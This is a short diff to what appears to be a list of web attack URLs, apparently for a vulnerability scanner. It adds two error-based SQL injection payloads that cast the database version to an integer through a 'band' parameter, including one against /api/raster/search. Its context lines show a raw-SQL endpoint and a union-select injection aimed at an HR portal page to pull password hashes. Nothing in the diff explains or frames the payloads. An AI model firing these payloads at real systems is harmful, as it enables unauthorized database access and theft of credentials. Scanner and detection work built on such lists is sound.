@@ -46,3 +46,5 @@
 /Api/portal/elementEcodeAddon/getSqlData?sql=
 /pweb/careerapply/HrmCareerApplyPerView.jsp?id=1%20union%20select%201,2,sys.fn_sqlvarbasetostr(HashBytes(
 /
+/?band=1)%20AND%201=CAST((SELECT%20version())%20AS%20INT)--
+/api/raster/search/?band=1)%20AND%201=CAST((SELECT%20version())%20AS%20INT)--
